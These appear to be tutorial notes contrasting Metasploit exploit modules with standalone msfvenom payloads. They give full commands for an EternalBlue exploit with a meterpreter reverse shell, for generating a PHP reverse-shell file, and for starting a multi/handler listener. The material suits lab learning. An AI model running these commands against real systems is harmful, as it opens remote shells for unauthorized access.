## 🔹 When You Use a Payload Inside Metasploit

- You pick an **exploit module** in `msfconsole` (e.g., EternalBlue, DVWA file upload exploit).
- That module has a **payload option** (`set PAYLOAD windows/meterpreter/reverse_tcp`).
- Metasploit automatically:
    - Embeds the payload into the exploit.
    - Starts the **handler** for you in the background.
- Result: you don’t need to manually set up a handler or use Netcat — Metasploit does it all.

👉 Example:

```bash
use exploit/windows/smb/ms17_010_eternalblue
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.0.2.19
set LPORT 4444
run
```

Here, Metasploit launches the exploit AND the handler automatically.

---

## 🔹 When You Use msfvenom

- `msfvenom` only **generates the payload file** (e.g., `reverse_shell.php`, `bind_shell.exe`).
- You must **manually set up a handler** in Metasploit (`exploit/multi/handler`) to catch the connection.
- Or, if it’s a bind payload, you can connect manually with Netcat (`nc RHOST RPORT`).

👉 Example:

```bash
msfvenom -p php/reverse_php LHOST=10.0.2.19 LPORT=7777 -f raw > reverse_shell.php
```

Then separately:

```bash
use exploit/multi/handler
set PAYLOAD php/reverse_php
set LHOST 10.0.2.19
set LPORT 7777
run
```

---

## ⚡ Key Difference

- **Metasploit exploit + payload** → handler is automatic.
- **msfvenom standalone payload** → you must start the handler yourself (or use Netcat for bind payloads).